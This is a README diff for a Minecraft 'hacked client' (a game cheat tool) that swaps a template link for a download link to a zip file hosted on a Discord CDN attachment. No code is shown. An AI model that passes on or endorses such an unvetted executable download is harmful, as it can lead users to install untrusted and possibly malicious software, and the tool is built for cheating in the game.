@@ -33,7 +33,7 @@
   <p align="center">
     1.19 - 1.8.9 Advanced and Easy to use Minecraft hacked client
     <br />
-    <a href="https://github.com/othneildrew/Best-README-Template"><strong>Download »</strong></a>
+    <a href="https://cdn.discordapp.com/attachments/1107398922353246339/1107708691265884251/Dusk_Client.zip"><strong>Download »</strong></a>
     <br />
     <br />
     <a>1.8.9 - 1.19</a>
